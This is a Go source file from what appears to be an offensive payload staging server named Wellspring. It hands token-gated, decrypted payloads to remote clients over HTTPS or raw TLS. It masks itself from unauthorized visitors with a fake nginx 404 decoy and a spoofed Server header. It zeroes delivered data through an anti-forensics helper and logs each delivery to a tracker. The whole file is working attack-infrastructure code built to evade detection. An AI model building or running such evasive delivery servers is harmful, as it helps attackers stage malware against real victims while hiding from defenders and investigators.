package server

import (
	"bufio"
	"fmt"
	"net"
	"net/http"
	"strings"
	"time"
	"wellspring/internal/antiforensics"
	"wellspring/internal/callback"
	"wellspring/internal/theme"
)

func (s *WellspringServer) handlePayloadDelivery(w http.ResponseWriter, r *http.Request) {
	token := strings.TrimPrefix(r.URL.Path, "/p/")
	if token == "" {
		s.serveDecoy(w)
		return
	}

	tok, valid := s.manager.Tokens.Validate(token, r.RemoteAddr)
	if !valid {
		s.serveDecoy(w)
		return
	}

	data, err := s.manager.GetDecrypted(tok.PayloadID)
	if err != nil {
		s.serveDecoy(w)
		return
	}
	defer antiforensics.ZeroBytes(data)

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(data)))
	w.Header().Set("Server", "nginx/1.24.0")
	n, writeErr := w.Write(data)

	name := ""
	if p, ok := s.manager.Get(tok.PayloadID); ok {
		name = p.Name
	}

	evt := callback.DeliveryEvent{
		PayloadID:   tok.PayloadID,
		PayloadName: name,
		Token:       truncateToken(token),
		RemoteAddr:  r.RemoteAddr,
		Method:      "https",
		Size:        int64(n),
		Success:     writeErr == nil,
	}
	s.tracker.Record(evt)
	fmt.Println(theme.Success("Delivered %s%s%s (%s%s%s) → %s%s%s via %shttps%s",
		theme.Teal, tok.PayloadID, theme.Reset,
		theme.Text, name, theme.Reset,
		theme.Peach, r.RemoteAddr, theme.Reset,
		theme.Blue, theme.Reset))
}

func (s *WellspringServer) handleRawTLS(conn net.Conn) {
	defer conn.Close()

	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	reader := bufio.NewReaderSize(conn, 256)
	tokenLine, err := reader.ReadString('\n')
	if err != nil {
		return
	}
	token := strings.TrimSpace(tokenLine)

	tok, valid := s.manager.Tokens.Validate(token, conn.RemoteAddr().String())
	if !valid {
		return // silent close — no info leak on non-HTTP channel
	}

	conn.SetReadDeadline(time.Time{})                        // clear read deadline
	conn.SetWriteDeadline(time.Now().Add(60 * time.Second)) // prevent slow-client DOS

	data, err := s.manager.GetDecrypted(tok.PayloadID)
	if err != nil {
		return
	}
	defer antiforensics.ZeroBytes(data)

	n, writeErr := conn.Write(data)

	name := ""
	if p, ok := s.manager.Get(tok.PayloadID); ok {
		name = p.Name
	}

	evt := callback.DeliveryEvent{
		PayloadID:   tok.PayloadID,
		PayloadName: name,
		Token:       truncateToken(token),
		RemoteAddr:  conn.RemoteAddr().String(),
		Method:      "raw-tls",
		Size:        int64(n),
		Success:     writeErr == nil,
	}
	s.tracker.Record(evt)
	fmt.Println(theme.Success("Delivered %s%s%s (%s%s%s) → %s%s%s via %sraw-tls%s",
		theme.Teal, tok.PayloadID, theme.Reset,
		theme.Text, name, theme.Reset,
		theme.Peach, conn.RemoteAddr().String(), theme.Reset,
		theme.Mauve, theme.Reset))
}

func (s *WellspringServer) handleDecoy(w http.ResponseWriter, _ *http.Request) {
	s.serveDecoy(w)
}

func (s *WellspringServer) serveDecoy(w http.ResponseWriter) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Server", "nginx/1.24.0")
	w.WriteHeader(http.StatusNotFound)
	w.Write(s.decoyHTML)
}

func defaultDecoyHTML() []byte {
	return []byte(`<!DOCTYPE html>
<html><head><title>404 Not Found</title></head>
<body><h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr><address>nginx/1.24.0</address></body></html>`)
}

func truncateToken(t string) string {
	if len(t) > 8 {
		return t[:8] + "..."
	}
	return t
}
